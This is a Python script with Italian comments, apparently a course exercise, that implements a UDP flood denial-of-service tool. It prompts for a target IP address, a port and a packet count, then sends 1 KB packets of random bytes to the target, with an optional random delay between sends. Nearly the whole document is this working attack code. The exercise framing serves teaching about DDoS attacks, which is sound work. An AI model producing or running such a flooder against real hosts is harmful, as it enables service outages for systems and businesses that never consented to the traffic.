#Traccia: Gli attacchi di tipo DDoS, ovvero Distributed Denial of Services, mirano 
#a saturare le richieste di determinati servizi rendendoli così indisponibili con 
#conseguenti impatti sul business delle aziende. Lʼesercizio di oggi è scrivere un 
#programma in Python che simuli un UDP flood, ovvero lʼinvio massivo di richieste 
#UDP verso una macchina target che è in ascolto su una porta UDP casuale 
#(nel nostro caso un DoS.  Requisiti:-Il programma deve richiedere lʼinserimento 
#dellʼIP target (input)-Il programma deve richiedere lʼinserimento della porta target 
#(input)-La grandezza dei pacchetti da inviare è di 1 KB per pacchetto – Suggerimento:
#per costruire il pacchetto da 1KB potete utilizzare il modulo «random»
#per la generazione di byte casuali.-Il programma deve chiedere allʼutente 
#quanti pacchetti da 1 KB inviare (input)
#SVOLGIMENTO: iniziamo ad importare le librerie che ci servono per generare i
#nostri pacchetti UDP
import socket
import random #ci permettera' di randomizzare i pacchetti 
import time  #ci permettera' l'invio di pacchetti con un determinato delay costruito da noi per l'es.facoltativo

def UDP_flood():
    #definiamo la variabile UDP_flood andando a inserire libreria random e scoket per creare i nostri pacchetti
    datidainviare = random._urandom(1024)
    if scelta_delay == "s":
            ritardo = random.uniform(0, 0.1)
            time.sleep(ritardo)
            print(f"[DELAY] Attesa di {ritardo:.4f} secondi...")
            #abbiamo definito anche il delay come ritardo che andremo a mettere nell'output come opzionale

#con il ciclo if abbiamo definito il delay di 0,1 secondi opzionale, con for in x siamo andati invece a definire
#il range di pacchetti come numero da voler inviare come una variabile input e inserito anche il deley pacchetti a 0.5


    for x in range(numeropacchetti):
        s.sendto(datidainviare , target)
        print( "#" ,x, "UDP-inviato\n")
        #deley pacchetti
        time.sleep(random.uniform(0, 0.05))


indirizzoip = str(input("inserisci l'indirizzo ip target: ")) 
porta = int(input("Inserisci la porta target: "))
numeropacchetti = int(input("Inserisci il numero di pacchetti da inviare : ")) 
scelta_delay = input("Vuoi attivare il delay casuale (0-0.1s)? (s/n): ")
#con il try ovviamente proviamo ad eseguire questi comandi con la condizione except socket close 
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    target = (str(indirizzoip) , int(porta))

except: 
    s.close()
    print("[!] Error!!!")

UDP_flood()        
        